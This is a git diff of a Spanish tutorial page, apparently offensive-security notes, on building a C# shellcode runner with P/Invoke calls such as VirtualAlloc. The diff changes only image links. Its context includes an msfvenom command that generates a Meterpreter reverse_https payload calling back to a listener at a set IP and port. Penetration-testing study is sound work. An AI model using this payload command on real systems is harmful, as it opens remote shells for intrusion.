@@ -12,7 +12,7 @@ Además,  C# es un lenguaje muy flexible y permite llamar a la función definida
 
 Para utilizar el unmanaged code, deberemos importar librerias que nos permitan esto. Por lo que haremos uso de P/Invoke para este paso. Por ejemplo para la funcion VirtualAlloc que está escrita en C, la podemos importar de la siguiente forma (eligiendo una de las tres):
 
-<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
 
 ## Crear el shellcode
 
@@ -20,8 +20,8 @@ Para utilizar el unmanaged code, deberemos importar librerias que nos permitan e
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.182.128 lport=443 -f csharp -o shellcode.cs 
 ```
 
-<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
 
 **Otros tipos de payloads en msfvenom:**
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
